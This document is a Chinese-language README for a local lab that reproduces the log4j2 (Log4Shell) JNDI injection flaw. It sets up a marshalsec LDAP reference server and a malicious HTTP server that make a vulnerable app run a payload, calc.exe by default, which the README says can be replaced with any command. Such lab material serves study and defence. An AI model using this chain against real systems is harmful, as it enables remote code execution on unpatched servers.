# log4j2漏洞复现

# 模块说明
| 模块 | 说明 |
| --- | --- |
| business-app | 正常的业务应用 |
| marshalsec | 攻击方搭建，用于启动LDAP服务的开源工具，通过submodule关联 https://github.com/mbechler/marshalsec |
| evil-http-server | 攻击方搭建，启动Http服务，提供恶意代码下载 |

# 复现过程

## 1. 修改要执行的恶意代码

项目中要默认要执行的代码如下，适用于Windows下启动计算器，可以换成适用于自己系统的其他命令

```
// evil-http-server/src/main/java/EvilObject.java 第5行
String[] commands = {"calc.exe"};
```

## 2. 初始化 marshalsec

marshalsec是通过子模块关联的，需要先执行以下命令将对应的项目下载下来

```
git submodule init
git submodule update
```

## 3. 使用maven进行编译

```
mvn clean package -DskipTests
```

## 4. 启动 marshalsec

```
java -cp marshalsec/target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:9090/#EvilObject" 9999
```

## 5. 启动 evil-http-server

```
java -jar evil-http-server/target/evil-http-server.jar
```

## 6. 运行 business-app

```
java -jar business-app/target/business-app.jar
```

## 7. 结果

正常的结果是执行了恶意代码，默认情况下在Windows下打开了计算器。

如果没有预期的结果，可以检查一下漏洞的前提条件

* JDK的版本小于 6u211 / 7u201 / 8u191 / 11.0.1
* 系统环境变量没有配置 LOG4J_FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS 为 true

